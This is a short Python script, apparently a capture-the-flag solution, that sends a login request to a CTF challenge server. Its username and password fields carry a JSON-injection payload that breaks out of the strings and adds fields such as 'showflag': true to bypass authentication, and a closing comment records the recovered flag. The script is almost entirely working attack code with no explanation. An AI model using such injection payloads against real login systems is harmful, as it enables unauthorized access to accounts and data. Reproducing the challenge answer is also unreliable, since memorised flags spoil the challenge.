import requests

url="https://challenges.isictf.live:1420/"



r=requests.post(url+"login",data={
    'username':'admin", "showflag": true, "username": null, "verht":"fj',
    'password':'vzl1" ,"password": null, "verht":"fj'
})

print(r.text)

#ISICTF{4n07h3r_1nj3c710n_4nd_4n07h3r_fl46}


